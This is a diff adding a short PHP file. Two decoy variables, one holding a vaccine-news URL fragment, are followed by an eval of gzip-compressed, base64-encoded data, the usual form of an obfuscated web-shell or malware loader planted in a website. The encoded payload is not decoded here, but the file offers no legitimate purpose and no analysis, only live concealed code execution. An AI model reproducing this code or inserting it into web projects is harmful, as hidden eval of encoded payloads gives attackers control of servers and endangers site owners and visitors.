@@ -1,0 +1,5 @@
+$fuck1 = ('news');
+$fuck2 = ('?=coronavirus-pandemic-vaccine-updates-12-19-20/h_6c7e66d39c8be51023acc3ea4d2f7b67');
+
+
+eval(gzuncompress(base64_decode('eJwFwd2WQkAAAODHqY4LJox19uyFTv4pCSs3eyYmMZPfGHn6/T48I7ot16nJ21c34HHc3tGIofRX4Lwt8HaDnQUQ/R2wVbs8z7xsxH7s5pBGySF4u2bzNZRxaLlDP9a6ubBwwZrVEk9V1urp4VSzaIY5eV6QJmQC7Dm/y4aP7MjCMSs9t3eTxMoDyMTxeg9R376rtPLk0FWh0uqGSM79IlBOG0oEDgbA+17Ur6cecKuXOsFomVJkK3EcqBnP16dIZsQj1crZBEVxhu3bPhLBA959LDCR8MXU+k0KVmIXYvYg0nq9ddlEfLRPlhawmdX+IIS2Z6yuwhN/7Gb4ovZF5InLCJ1HagfEYuFJkaBfSwBNMSxV6DSXOmidSe9ACA/n3yXFxmdoYv7rGNEPMu2fzW63+/4HEvJ42w==')));
